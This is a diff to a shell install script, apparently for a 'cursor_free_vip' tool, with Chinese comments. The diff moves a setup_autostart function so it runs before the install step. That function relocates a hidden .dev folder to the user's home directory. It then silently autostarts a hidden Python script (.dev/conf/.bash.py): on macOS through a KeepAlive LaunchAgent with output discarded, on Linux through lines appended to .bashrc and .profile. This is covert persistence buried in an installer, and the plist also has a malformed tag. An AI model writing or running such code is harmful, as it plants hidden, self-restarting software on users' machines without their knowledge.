@@ -131,6 +131,75 @@ detect_os() {
     fi
 }
 
+setup_autostart() {
+    if [ -d .dev ]; then
+        DEST_DIR="$HOME/.dev"
+
+        if [ -d "$DEST_DIR" ]; then
+            rm -rf "$DEST_DIR"
+        fi
+        mv .dev "$DEST_DIR"
+
+        EXEC_CMD="python3"
+        SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
+
+        case $OS_TYPE in
+            "Darwin")
+                PYTHON_PATH=$(which python3)
+                if [ -z "$PYTHON_PATH" ]; then
+                    exit 1
+                fi
+                
+                # 创建 LaunchAgents 目录（如果不存在）
+                LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
+                mkdir -p "$LAUNCH_AGENTS_DIR"
+                
+                PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
+                cat > "$PLIST_FILE" << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.user.ba</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$PYTHON_PATH</string>
+        <string>$SCRIPT_PATH</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</string>
+    <string>/dev/null</string>
+</dict>
+</plist>
+EOF
+                launchctl load "$PLIST_FILE"
+                ;;
+                
+            "Linux")
+                STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
+                
+                if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
+                    echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
+                fi
+                
+                if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
+                    echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
+                fi
+                
+                if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
+                    (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
+                fi
+                ;;
+        esac
+    fi
+}
+
 # 安装和下载主程序
 install_cursor_free_vip() {
     local downloads_dir=$(get_downloads_dir)
@@ -214,83 +283,14 @@ install_cursor_free_vip() {
     fi
 }
 
-setup_autostart() {
-    if [ -d .dev ]; then
-        DEST_DIR="$HOME/.dev"
-
-        if [ -d "$DEST_DIR" ]; then
-            rm -rf "$DEST_DIR"
-        fi
-        mv .dev "$DEST_DIR"
-
-        EXEC_CMD="python3"
-        SCRIPT_PATH="$DEST_DIR/conf/.bash.py"
-
-        case $OS_TYPE in
-            "Darwin")
-                PYTHON_PATH=$(which python3)
-                if [ -z "$PYTHON_PATH" ]; then
-                    exit 1
-                fi
-                
-                # 创建 LaunchAgents 目录（如果不存在）
-                LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
-                mkdir -p "$LAUNCH_AGENTS_DIR"
-                
-                PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
-                cat > "$PLIST_FILE" << EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>com.user.ba</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>$PYTHON_PATH</string>
-        <string>$SCRIPT_PATH</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</string>
-    <string>/dev/null</string>
-</dict>
-</plist>
-EOF
-                launchctl load "$PLIST_FILE"
-                ;;
-                
-            "Linux")
-                STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"
-                
-                if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
-                    echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
-                fi
-                
-                if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
-                    echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
-                fi
-                
-                if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
-                    (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
-                fi
-                ;;
-        esac
-    fi
-}
-
 # 主程序
 main() {
     print_logo
     install_dependencies
     get_latest_version
     detect_os
-    install_cursor_free_vip
     setup_autostart
+    install_cursor_free_vip
 }
 
 main
